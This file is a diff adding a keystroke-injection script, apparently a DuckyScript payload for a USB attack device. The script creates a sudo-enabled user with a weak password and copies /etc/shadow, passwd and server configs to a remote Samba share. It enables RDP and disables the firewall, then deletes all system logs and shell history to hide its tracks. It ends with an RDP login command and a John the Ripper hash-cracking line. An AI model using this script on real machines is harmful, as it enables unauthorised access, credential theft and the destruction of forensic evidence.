@@ -1,0 +1,127 @@
+DELAY 5000
+REM Open Terminal
+CTRL ALT t
+DELAY 5000
+STRING sudo -ni
+ENTER
+DELAY 2000
+
+REM Creating the user
+STRING sudo adduser cnstest --disabled-password --gecos ""
+ENTER
+DELAY 1000
+STRING echo "cnstest:123456" | sudo chpasswd
+ENTER
+DELAY 1000
+
+REM Add the user to the sudo group to grant administrative privileges
+STRING sudo usermod -aG sudo cnstest
+ENTER
+DELAY 3000
+
+REM Switch user to cnstest
+STRING sudo -iu cnstest
+ENTER
+DELAY 5000
+
+REM Create mount directory for Samba share
+STRING mkdir -p ~/samba_share
+ENTER
+DELAY 1000
+
+REM Mount the Samba share
+STRING echo '123456' | sudo -S mount -t cifs -o username=cnstest,password=123456 //192.168.128.143/Anonymous ~/samba_share
+ENTER
+DELAY 3000
+
+REM Copy necessary system files to the shared directory
+DELAY 1000
+STRING sudo cp /etc/shadow ~/samba_share/
+ENTER
+DELAY 1000
+STRING sudo cp /etc/passwd ~/samba_share/
+ENTER
+DELAY 1000
+STRING sudo cp /etc/group ~/samba_share/
+ENTER
+DELAY 1000
+STRING sudo cp /etc/hosts ~/samba_share/
+ENTER
+DELAY 1000
+STRING sudo cp /etc/crontab ~/samba_share/
+ENTER
+DELAY 1000
+STRING sudo cp /etc/fstab ~/samba_share/
+ENTER
+DELAY 1000
+STRING sudo cp /etc/resolv.conf ~/samba_share/
+ENTER
+DELAY 1000
+STRING sudo cp /etc/profile ~/samba_share/
+ENTER
+DELAY 3000
+REM Copy server configuration files
+STRING sudo cp /etc/apache2/apache2.conf ~/samba_share/
+ENTER
+STRING sudo cp /etc/mysql/my.cnf ~/samba_share/
+ENTER
+
+REM Enable RDP
+STRING sudo apt-get install xrdp
+ENTER
+DELAY 5000
+STRING sudo systemctl enable xrdp
+ENTER
+DELAY 3000
+STRING sudo systemctl start xrdp
+ENTER
+DELAY 1000
+STRING sudo echo "RDP enabled with username: cnstest and password: 123456" > ~/samba_share/rdp_creds.txt
+ENTER
+
+REM Open firewall for RDP and disable firewall
+STRING sudo ufw allow 3389/tcp
+ENTER
+DELAY 1000
+STRING sudo ufw disable
+ENTER
+DELAY 1000
+
+
+STRING sudo umount -l ~/samba_share && sudo rm -rf /home/cnstest
+ENTER
+DELAY 2000
+
+REM Kill any processes owned by the user
+STRING sudo pkill -u cnstest
+ENTER
+DELAY 1000
+
+REM Clean up and secure the changes
+STRING sudo find /var/log -type f -delete
+ENTER
+STRING history -c && exit
+ENTER
+DELAY 1000
+
+
+REM Delete the temporary user and clean up
+STRING sudo deluser cnstest --remove-home
+ENTER
+DELAY 3000
+
+REM Clean up any remaining files just in case
+STRING sudo rm -rf /home/cnstest
+ENTER
+DELAY 1000
+
+REM Clear bash history and exit the shell
+STRING history -c && exit
+ENTER
+STRING exit
+ENTER
+###############################################################################################################
+
+xfreerdp /u:test /p:123456 /v:192.168.128.138 /dynamic-resolution
+
+john -- format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt formated_hashes.txt
